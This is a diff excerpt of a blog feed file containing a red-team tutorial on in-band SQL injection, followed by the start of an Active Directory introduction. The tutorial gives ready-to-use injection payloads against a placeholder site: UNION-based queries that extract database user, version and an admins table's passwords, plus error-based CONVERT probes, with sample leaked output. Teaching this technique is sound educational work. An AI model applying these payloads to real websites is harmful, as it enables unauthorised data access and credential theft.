+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT name, message FROM comments WHERE cid=10;
+</code></pre>
+</div>
+
+<p>Nothing fancy. But if the input isn’t sanitized, try this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+https://comments.sys/view.php?cid=10 UNION SELECT user(), database();
+</code></pre>
+</div>
+
+<p>Page now shows:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+Name: root@localhost
+Message: blogdb
+</code></pre>
+</div>
+
+<p>No authentication. No session. Just raw data harvested through the same request channel.</p>
+
+<hr />
+
+<h2 id="subtypes-of-in-band-sqli">Subtypes of In-Band SQLi</h2>
+
+<h4 id="1-error-based-sql-injection">1. Error-Based SQL Injection</h4>
+
+<p>This one rides on the <strong>error output</strong> from the database itself. If the backend is verbose (MySQL, MSSQL, PostgreSQL, etc.), you can throw crafted payloads and get the <strong>structure of the database dumped back at you</strong>.</p>
+
+<p><strong>Example:</strong></p>
+
+<p>Original URL:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+https://comments.sys/view.php?cid=10
+</code></pre>
+</div>
+
+<p>Try this:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+https://comments.sys/view.php?cid=10 AND 1=CONVERT(int,(SELECT @@version));
+</code></pre>
+</div>
+
+<p>If error messages are on, you get:</p>
+
+<div class="alert-error">
+Error: Conversion failed when converting the varchar value 'Microsoft SQL Server 2019' to data type int.
+</div>
+
+<p>You now know the DB engine and version.</p>
+
+<p>Keep chaining errors and use the messages to:</p>
+
+<ul>
+  <li>
+    <p>Discover table names</p>
+  </li>
+  <li>
+    <p>Leak column names</p>
+  </li>
+  <li>
+    <p>Reveal datatypes</p>
+  </li>
+  <li>
+    <p>Map the entire schema</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p><strong>Pro tip:</strong> Use <code class="language-plaintext highlighter-rouge">GROUP BY</code>, <code class="language-plaintext highlighter-rouge">ORDER BY</code>, or broken <code class="language-plaintext highlighter-rouge">CAST()</code>/<code class="language-plaintext highlighter-rouge">CONVERT()</code> to squeeze out leaks.</p>
+</blockquote>
+
+<hr />
+
+<h3 id="2-union-based-sql-injection">2. UNION-Based SQL Injection</h3>
+
+<p>This is your primary data extraction tool. You piggyback off a legit <code class="language-plaintext highlighter-rouge">SELECT</code> and bolt your own query onto it using the <strong><code class="language-plaintext highlighter-rouge">UNION</code></strong> keyword.</p>
+
+<p>But here’s the catch:</p>
+
+<ul>
+  <li>
+    <p>You must match the <strong>column count</strong> of the original query.</p>
+  </li>
+  <li>
+    <p>The <strong>data types</strong> must align.</p>
+  </li>
+</ul>
+
+<p>Let’s walk it.</p>
+
+<p>Original vulnerable query:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQL</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sql">
+SELECT title, content FROM articles WHERE id=3;
+</code></pre>
+</div>
+
+<p>First test: Find column count.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+?id=3 ORDER BY 1-- ✅
+?id=3 ORDER BY 2-- ✅
+?id=3 ORDER BY 3-- ❌ (error)
+</code></pre>
+</div>
+
+<p>Means 2 columns.</p>
+
+<p>Now inject:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-sqli">
+?id=3 UNION SELECT username, password FROM admins--
+</code></pre>
+</div>
+
+<p>Output:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">SQLI</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-web">
+Title: admin
+Content: s3cur3p@ssw0rd
+</code></pre>
+</div>
+
+<p>You just leaked creds. Over the front door. In plain sight.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><strong>What is Active Directory?</strong>
 Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).</p>
